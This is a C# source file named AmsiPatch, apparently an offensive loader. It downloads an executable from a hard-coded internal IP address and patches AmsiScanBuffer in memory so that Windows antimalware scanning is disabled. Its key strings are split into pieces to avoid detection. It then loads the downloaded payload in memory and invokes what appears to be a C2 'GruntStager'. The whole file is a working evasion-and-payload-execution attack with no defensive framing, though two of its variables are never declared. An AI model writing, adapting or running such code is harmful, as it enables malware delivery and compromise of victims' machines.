using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using System.Net;

namespace AmsiPatch
{
    class Program
    {
        static void Main(string[] args)
        {

            var client = new WebClient();
            var gstag = client.DownloadData("http://10.8.0.26:8080/covid.exe");
            client.Dispose();

            string part1 = "am";
	          string part2 = "si";
            string part3 = ".dll";
	          string tot = part1 + part2 + part3;
            var amsiDLL = LoadLibrary(tot);
            

            string sbpart1 = "Am";
	          string sbpart2 = "siSca";
            string sbpart3 = "nBuf";
            string sbpart4 = "fer";
            var amsilel = sbpart1 + sbpart2 + sbpart3 + sbpart4;
            

            var absAddress = GetProcAddress(amsiDLL, amsilel);
            var ret = new byte[] { 0xC3 };
            VirtualProtect(absAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
            Marshal.Copy(ret, 0, absAddress, ret.Length);
            VirtualProtect(absAddress, (UIntPtr)ret.Length, oldProtect, out uint _);

            var asm = Assembly.Load(gstag);
            
            
            string gs1 = "Grun";
            string gs2 = "tSta";
            string gs3 = "ger";
            tot2 = gs1 + gs2 + gs3;
            tot3 = tot2 + "." + tot2;
            var type = asm.GetType(tot3);
            
            var instance = Activator.CreateInstance(type);
            type.InvokeMember("gstag", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr ipAddress, UIntPtr dwSize ,uint flNewProtect, out uint lpflOldProtect);
    }
}
